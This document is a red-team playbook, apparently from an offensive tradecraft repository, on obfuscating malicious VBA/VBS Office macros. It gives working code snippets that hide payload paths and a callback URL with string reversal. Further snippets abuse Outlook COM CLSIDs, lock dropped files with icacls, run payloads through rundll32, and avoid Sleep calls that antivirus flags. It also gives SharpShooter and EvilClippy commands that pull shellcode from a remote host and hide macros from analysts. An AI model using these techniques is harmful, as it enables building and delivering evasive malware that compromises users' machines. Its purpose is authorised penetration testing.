<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# VBA/VBS Obfuscation ([`Office` TTP](TTP/T1137_Office_Application_Startup/T1137.md), [`Command and Scripting Interpreter - Visual Basic` TTP](TTP/T1059_Command_and_Scripting_Interpreter/005_Visual_Basic/T1059.005.md))

### References

* <details><summary>References (Click to expand)</summary><p>
	* Johnlatwc Twitter: Example macro -<br />[https://twitter.com/johnlatwc/status/1236403291845611520](https://twitter.com/johnlatwc/status/1236403291845611520)
	* Didier Stevens Blog: PowerShell, Add-Type & csc.exe -<br />[https://blog.didierstevens.com/2019/10/15/powershell-add-type-csc-exe/](https://blog.didierstevens.com/2019/10/15/powershell-add-type-csc-exe/)
	* FireEye/Mandiant: Hunting COM Object -<br />[https://www.mandiant.com/resources/hunting-com-objects](https://www.mandiant.com/resources/hunting-com-objects)
	* Arno0x Github: -<br />([https://gist.github.com/Arno0x/89be7921e4467dd402b71ce6e29fcec1](https://gist.github.com/Arno0x/89be7921e4467dd402b71ce6e29fcec1))

### Example Scripts/Attacks

* <details><summary>Excel (Click to expand)</summary><p>
	* [Example 1](Testaments_and_Books/Redvelations/Windows/Payloads/VBA1.vba)
		* Features
			* Execute upon macro enabling
		* Lines to Modify
			* Modify backwards URL to point to your infrastructure
* <details><summary>Word (Click to expand)</summary><p>
	* [Example 1](Testaments_and_Books/Redvelations/Windows/Payloads/VBA2.vba)
		* Modify the infrastructure position to your infrastructure URL

### Process

1. Write/code the malicious activity ([VBA/VBS Execution Guide](Testaments_and_Books/Redvelations/Windows/002-3_VBA-VBS_Execution.md))
1. Implement Defense Evasion
	* <details><summary>Manual Code Edits (Click to expand)</summary><p>
		* Separate the commands and data to be executed across multiple variables
		* Include generic commented words between commands
			* `# Business happens here`
		* <details><summary>Obfuscate file contents by writing as a single line (Click to expand)</summary><p>

				rrea = StrReverse("<BACKWARDS_INFRASTRUCTURE_URL")
				a.WriteLine ("[Connection Manager]" & vbNewLine & "CMSFile=settings.txt" & vbNewLine & "ServiceName=WindowsUpdate" & vbNewLine & "TunnelFile=settings.txt" & vbNewLine & "[Settings]" & vbNewLine & "UpdateUrl=" & rrea)
		* <details><summary>Performing functions through an array (Click to expand)</summary><p>

				Dim dpdp(0 To 3) As String
			* Example: Define the target filepath through array functions

					Dim dpdp(0 To 3) As String
					dpdp(0) = StrReverse("\sresU\:C")
					dpdp(1) = user
					dpdp(2) = StrReverse("\foorP\tfosorciM\gnimaoR\ataDppA\")
					dpdp(3) = StrReverse("txt.sgnittes")
					sfile = Dir(dpdp(0) & dpdp(1) & dpdp(2) & "VPN*.TMP")
		* <details><summary>Abuse COM Object CLSIDs (Click to expand)</summary><p>
			1. Choose a process to call by COM object ([COM and CLSID Guide](Testaments_and_Books/Redvelations/Windows/002-6_Windows_COM_Objects.md)). Copy the corresponding CLSID.
				* `Outlook.exe`

						0006F03A-0000-0000-C000-000000000046
				* Secondary `Outlook` if first stops works

						0006F033-0000-0000-C000-000000000046
			1. Insert the CLSID as below:

					Set objShell = GetObject("new:{0006F03A-0000-0000-C000-000000000046}")
		* <details><summary>Define a file path that... (Click to expand)</summary><p>
			* AVs won't catch
				* General
				* Defender
					* 
				* Sophos
					* `C:\TMP\`
				* Test
			* The user will have permission to access
			* The user won't notice
				* Avoid
					* The User's Desktop
				* Recommended
		* <details><summary>Define filenames and file... (Click to expand)</summary><p>
			* In segments
				* `Dim p1 As String`
				* `Dim p2 As String`
				* `p1 = ".tpircSW"`
				* `p2 = "llehS"`
			* Written in reverse
				* `StrReverse()`
		* <details><summary>icacls (Click to expand)</summary><p>
			* Two Steps
				1. Set temporary file to be unremovable (temporarily)

						objShell.CreateObject(StrReverse(p1) + StrReverse(p2)).Run "icacls.exe " & dpdp(0) & dpdp(1) & dpdp(2) & " /deny %username%:(OI)(CI)(DE,DC)", 0, True
					* Unobfuscated command

							icacls.exe <filename> /deny %username%:(OI)CI(DE,DC), 0, True
				1. Set temporary file to be removable

						objShell.CreateObject(StrReverse(p1) + StrReverse(p2)).Run "icacls.exe " & dpdp(0) & dpdp(1) & dpdp(2) & " /remove:d %username%", 0, True
					* Unobfuscated command

							icacls.exe <filename> /remove:d %username%, 0, True
		* <details><summary>Command Execution (Click to expand)</summary><p>
			* LOLBINs
				* `rundll32.exe`

						objShell.CreateObject(StrReverse(p1) + StrReverse(p2)).Run "rundll32.exe " & dpdp(0) & dpdp(1) & dpdp(2) & sfile & ",Main", 0, True
		* <details><summary>Rewrite functions commonly triggering AV (Click to expand)</summary><p>
			* Sleep (see function mimicry above)

					Sub tent(n As Long)
						Dim t As Date
						t = Now
						Do
							DoEvents
						Loop Until Now >= DateAdd("s", n, t)
					End Sub
				* Necessary to allow behind-the-scenes execution to occur prior to the document function being applied
	1. <details><summary>Obfuscation with Tools (Click to expand)</summary><p>
		* <details><summary>MacroPack (Click to expand)</summary><p>
			* [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack)
			* The tool is compatible with payloads generated by popular pentest tools (Metasploit, Empire, ...). It is also easy to combine with other tools as it is possible to read input from stdin and have a quiet output to another tool. This tool is written in Python3 and works on both Linux and Windows platform
			* Tool used to automatize obfuscation and generation of retro formats such as MS Office documents or VBS like format.
				* Handles various shortcuts formats
				* Everything can be done using a single line of code
				* Generation of majority of Office formats and VBS based formats
				* Payloads for advanced social engineering attacks (email, USB key, etc)
		* <details><summary>SharpShooter -<br />[https://github.com/mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter) (Click to expand)</summary><p>

				SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
		* <details><summary>EvilClippy -<br />[https://github.com/outflanknl/EvilClippy](https://github.com/outflanknl/EvilClippy) (Click to expand)</summary><p>
			* EvilClippy is used to perform VBA stomping and a few other tricks to help hide macros in Excel and Word documents.
			* We've had challenges working on `.xls` and `.doc` files
			* Features
				* Hide VBA macros from the GUI editor
				* VBA stomping (P-code abuse)
				* Fool analyst tools
				* Serve VBA stomped templates via HTTP
				* Set/Remove VBA Project Locked/Unviewable Protection
				* Remove Metadata from the file
			* [Working Payload Link](Testaments_and_Books/Redvelations/Windows/Payloads/Evil_Clippy_Working_Payload.md)
			* Command

					./EvilClippy.exe -r -g -u -d <File>
				* Flags
					* `-d` - (optional) remove metadata
					* `-r` - (optional) randomize module names
					* `-g` - (optional) hide macros from the GUI
					* `-u` - (optional) make the VBA project unviewable
		* <details><summary>Office Purge -<br />[https://github.com/mandiant/OfficePurge](https://github.com/mandiant/OfficePurge) (Click to expand)</summary><p>
			* Removes P-code from module streams within Office documents. 
			* Supports VBA purging Microsoft Office Word (.doc), Excel (.xls), and Publisher (.pub) documents
		* <details><summary>DidierStevensSuite (Click to expand)</summary><p>
			* "tool to create a VBScript containing shellcode to execute"
			* [https://github.com/DidierStevens/DidierStevensSuite/blob/master/shellcode2vbscript.py](https://github.com/DidierStevens/DidierStevensSuite/blob/master/shellcode2vbscript.py)


([`Office - Add-ins` TTP](TTP/T1137_Office_Application_Startup/006_Add-ins/T1137.006.md))
([`Office - Office Template Macros` TTP](TTP/T1137_Office_Application_Startup/001_Office_Template_Macros/T1137.001.md))